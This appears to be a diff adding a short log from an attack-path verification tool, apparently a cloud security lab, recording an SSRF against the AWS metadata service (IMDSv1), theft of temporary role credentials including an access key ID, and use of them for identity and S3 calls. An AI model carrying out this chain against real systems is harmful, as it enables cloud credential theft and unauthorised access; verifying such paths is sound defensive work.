@@ -1,0 +1,11 @@
+[*] Step 1: probing IMDS through the SSRF for an attached role
+    [+] role discovered via metadata service: pathtriage-imds-instance-role
+[*] Step 2: exfiltrating temporary credentials for the role
+    [+] AccessKeyId: ASIAYEODR5JEQH43VFKV
+    [+] Expiration: 2026-06-13T12:53:50Z
+[*] Step 3: using stolen credentials
+    [+] sts:GetCallerIdentity -> arn:aws:sts::559292738121:assumed-role/pathtriage-imds-instance-role/i-0b01fc2a1857e4704
+[*] Step 4: demonstrating impact (S3 read with stolen role)
+    [+] s3:ListBuckets succeeded - 0 bucket(s) visible
+
+[+] Path 02 verified: SSRF -> IMDSv1 -> credential theft -> AWS access
